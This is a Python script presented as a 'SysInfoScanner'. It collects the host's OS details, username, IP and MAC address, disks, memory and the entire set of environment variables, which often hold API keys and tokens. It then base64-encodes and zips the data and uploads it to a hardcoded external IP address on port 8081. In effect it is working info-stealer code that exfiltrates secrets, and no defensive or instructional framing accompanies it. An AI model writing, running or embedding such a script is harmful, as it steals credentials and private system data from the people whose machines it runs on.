from __future__ import annotations

import os, sys, json, base64, socket, zipfile, tempfile, traceback, platform, getpass, subprocess
from pathlib import Path
import uuid as _uuid
import requests, psutil
from dotenv import load_dotenv

load_dotenv()


class SysInfoScanner:
    def __init__(self, save_location: Path):
        self.save_location = save_location

    def os_info(self):
        p = platform
        return {"OS": p.system(), "OS Version": p.version(), "Release": p.release()}

    def mach_proc_info(self):
        p = platform
        return {"Machine": p.machine(), "Processor": p.processor(), "Architecture": p.architecture()}

    def user_info(self):
        try:
            return {"User": getpass.getuser()}
        except:
            return {"User": None}

    def network_info(self):
        ip = None
        try:
            ip = socket.gethostbyname(socket.gethostname())
            if ip.startswith("127."):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect(("8.8.8.8", 80))
                    ip = s.getsockname()[0]
                finally:
                    s.close()
        except:
            pass

        try:
            node = _uuid.getnode()
            mac = ":".join(f"{(node >> (i * 8)) & 0xff:02x}" for i in reversed(range(6)))
        except:
            mac = None

        return {"IP Address": ip, "MAC Address": mac}

    def disk_info(self):
        try:
            return {"Disk Partitions": [
                {"device": d.device, "mountpoint": d.mountpoint, "fstype": d.fstype}
                for d in psutil.disk_partitions()
            ]}
        except:
            return {"Disk Partitions": []}

    def mem_info(self):
        try:
            v = psutil.virtual_memory()
            return {"Total Memory": v.total, "Available Memory": v.available}
        except:
            return {"Total Memory": None, "Available Memory": None}

    def env_info(self):
        try:
            return {"Environment Variables": dict(os.environ)}
        except:
            return {"Environment Variables": {}}

    def _encode(self, info: dict):
        return base64.b64encode(json.dumps(info).encode()).decode()

    def _compress(self, encoded_info: str, filename: str):
        path = self.save_location / filename
        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr("systeminfo.txt", encoded_info)
        return path

    def collect_and_send(self, upload_url: str):
        try:
            info = {
                **self.os_info(),
                **self.mach_proc_info(),
                **self.user_info(),
                **self.network_info(),
                **self.disk_info(),
                **self.mem_info(),
                **self.env_info(),
            }
            zpath = self._compress(self._encode(info), "info.zip")

            with open(zpath, "rb") as f:
                print(f"[+] Sending data to {upload_url}")
                r = requests.post(upload_url, files={"file": f}, timeout=20)
                print("[+] Response:", r.status_code, r.text)

        except Exception as e:
            print("[-] Failed:", e)
            traceback.print_exc()


if __name__ == "__main__":
    scanner = SysInfoScanner(Path(tempfile.gettempdir()))
    scanner.collect_and_send("http://20.93.23.234:8081/upload")
